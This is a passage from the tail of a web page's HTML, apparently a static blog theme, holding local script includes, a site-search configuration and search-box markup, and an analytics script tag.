src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>